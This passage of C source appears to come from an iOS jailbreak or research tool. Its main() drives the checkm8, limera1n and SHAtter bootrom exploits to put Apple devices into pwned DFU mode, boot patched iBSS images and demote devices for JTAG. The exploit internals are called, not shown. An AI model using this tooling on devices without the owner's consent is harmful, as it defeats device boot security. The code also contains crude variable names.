                aes(device, IV, Key, fuck, &fuck2, *outsz);
                memcpy(file+ibss_data_start, fuck2, *outsz);
                
                free(fuck);
                free(fuck2);
            }
            
            *out = malloc(*outsz);
            memcpy(*out, file+ibss_data_start, *outsz);
            
            uint32_t out_magic = *(uint32_t*)(*out + offsetof(struct img3File, magic));
            debug("out magic: 0x%08x", out_magic);
            return 0;
            break;
            
        default:
            printf("Invalid image\n");
            return -1;
            break;
    }
    
    printf("Invalid image\n");
    return -1;
}

void usage(char** argv) {
    printf("usage: %s [options]\n", argv[0]);
    printf("\t-p\t\tput device in pwned DFU mode\n");
    printf("\t\t\t*support device lists\n");
    printf("\t\t\t\t s5l8920x ... limera1n\n");
    printf("\t\t\t\t s5l8922x ... limera1n\n");
    printf("\t\t\t\t s5l8930x ... limera1n\n");
    printf("\t\t\t\t s5l895xx ... checkm8\n");
    printf("\t\t\t\t s5l8960x ... checkm8\n");
    printf("\n");
    printf("\t-s\t\tput device device in pwned DFU mode for s5l8930x devices\n");
    printf("\t\t\t*use SHAtter instead of limera1n\n");
    printf("\n");
    printf("\t-d\t\tdemote device to enable JTAG\n");
    printf("\n");
    printf("\t-f <ibss/illb>\tenter soft DFU mode\n");
}

int main(int argc, char** argv) {
    
    if(argc == 1) {
        usage(argv);
        return -1;
    }
    
    int ret;
    int pwned_dfu = 0;
    int send = 0;
    int demote = 0;
    FILE* fp = NULL;
    void* file;
    size_t file_len;
    void* ibss;
    size_t ibss_sz;
    int shatter = 0;
    
    if(!strcmp(argv[1], "-p")) {
        pwned_dfu = 1;
    } else if(!strcmp(argv[1], "-s")) {
        pwned_dfu = 1;
        shatter = 1;
    } else if(!strcmp(argv[1], "-d")) {
        demote = 1;
    } else if(!strcmp(argv[1], "-f")) {
        send = 1;
        
        fp = fopen(argv[2], "rb");
        if(!fp) {
            printf("ERROR: opening %s!\n", argv[2]);
            return -1;
        }
        
        fseek(fp, 0, SEEK_END);
        file_len = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        
        file = (void*)malloc(file_len);
        fread(file, 1, file_len, fp);
        fclose(fp);
        
    } else {
        usage(argv);
        return -1;
    }
    
    if(pwned_dfu) {
        
        libexploit_init();
        int exploit_init_done = 0;
        
        if(libexploit_get_device() != 0) {
            printf("connect the device in DFU mode.\n");
            return -1;
        }
        
        if (exploit_init_done == 0 && shatter == 1){
            if(shatter_supported(device) == 0){
                debug("SHAtter");
                shatter_init();
                exploit_init_done = 1;
            } else {
                printf("This device does not support SHAtter\n");
                return -1;
            }
        }
        
        if (exploit_init_done == 0){
            if(checkm8_supported(device) == 0){
                debug("checkm8");
                checkm8_init();
                exploit_init_done = 1;
            }
        }
        
        if (exploit_init_done == 0){
            if(limera1n_supported(device) == 0){
                debug("limera1n");
                limera1n_init();
                exploit_init_done = 1;
            }
        }
        
        if (exploit_init_done != 1){
            printf("This device is not supported\n");
            return -1;
        }
        
        ret = libexploit_compatible();
        if(ret != 0) {
            libexploit_exit();
            printf("this is not a compatible device.\n");
            return -1;
        }
        
        char* srtg = get_srtg(device);
        if(!srtg) {
            printf("make sure device is in SecureROM DFU mode and not LLB/iBSS (soft) DFU mode.\n");
            return 0;
        }
        
        ret = usb_is_pwned_dfu(device);
        if(ret) {
            printf("device is already in pwned DFU mode. not executing exploit.\n");
            return 0;
        }
        
        ret = libexploit_exploit();
        if (ret != 0) {
            libexploit_exit();
            printf("failed to enter pwned DFU mode\n");
            return -1;
        }
    }
    
    if(send) {
        
        libexploit_init();
        
        if(libexploit_get_device() != 0) {
            printf("connect the device in DFU mode.\n");
            return -1;
        }
        
        char* srtg = get_srtg(device);
        if(!srtg) {
            printf("this device is already LLB/iBSS (soft) DFU mode.\n");
            return 0;
        }
        
        ret = usb_is_checkm8_dfu(device);
        if(ret) {
            debug("checkm8");
            uint16_t cpid = usb_get_cpid(device);
            switch(cpid) {
                case 0x8960:
                    ret = boot_ibss_normal(file, file_len);
                    break;
                default: /* 32-bit */
                    ret = check_img3_file_format(device, file, file_len, &ibss, &ibss_sz);
                    if (ret != 0){
                        error("failed to boot soft DFU.");
                        return -1;
                    }
                    debug("boot");
                    ret = boot_ibss_checkm8(device, (void*)ibss, ibss_sz);
                    break;
            }
        }
        else {
            debug("send ibss/illb");
            ret = boot_ibss_normal(file, file_len);
        }
        free(file);
        if(ret != 0) {
            error("failed to boot soft DFU.");
            return -1;
        }
        
    }
    
    if(demote) {
        
        int ret;
        
        libexploit_init();
        if(libexploit_get_device() != 0) {
            printf("connect the device in DFU mode.\n");
            return -1;
        }
        
        char* srtg = get_srtg(device);
        if(!srtg) {
            printf("make sure device is in SecureROM DFU mode and not LLB/iBSS (soft) DFU mode.\n");
            return 0;
        }
        
        ret = usb_is_pwned_dfu(device);
        if(!ret) {
            printf("device is not in pwned DFU mode. not executing exploit.\n");
            return 0;
        }
        
        ret = usb_is_checkm8_dfu(device);
        if(!ret) {
            printf("device is not in checkm8 pwned DFU mode. not executing exploit.\n");
            return 0;
        }
        return demote_checkm8(device);
    }
    
    return 0;
}
